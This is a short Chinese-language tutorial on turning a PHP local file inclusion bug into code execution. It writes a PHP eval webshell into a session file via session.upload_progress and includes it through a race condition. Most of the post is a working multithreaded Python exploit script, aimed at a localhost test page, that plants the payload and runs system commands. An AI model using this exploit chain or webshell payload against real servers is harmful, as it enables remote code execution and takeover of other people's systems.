php.ini默认配置

> 1. session.upload_progress.enabled = On
> 2. session.upload_progress.cleanup = On
> 3. session.use_strict_mode = 0   // 用户可以自定义PHPSESSID

```php
<?php
$a = $_GET['file'];
include "$a";
```

显然存在一个文件包含漏洞，但在没有恶意文件或未知的情况下，是否无法利用了呢？

其实可以通过session.upload_progress将恶意代码写入session文件，进而包含。

当默认配置 `session.upload_progress.cleanup = on`导致文件上传后，session文件内容立即清空

此时可以利用条件竞争来包含文件

```python
import io
import requests
import threading

sessid = 'Taco'
data = {"cmd": "system('calc');"}


def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post('http://127.0.0.1:63342/PhpCode/fun.php',
                            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'},
                            files={'file': ('test.txt', f)}, cookies={'PHPSESSID': sessid})


def read(session):
    while True:
        resp = session.post('http://127.0.0.1:63342/PhpCode/fun.php?file=session/sess_' + sessid, data=data)
        if 'test.txt' in resp.text:
            print(resp.text)
            event.clear()
        else:
            print("[+++++++]retry")


if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        for i in range(1, 30):
            threading.Thread(target=write, args=(session,)).start()
        for i in range(1, 30):
            threading.Thread(target=read, args=(session,)).start()
    event.set()
```

注：上传的文件要大些，否则很难竞争成功

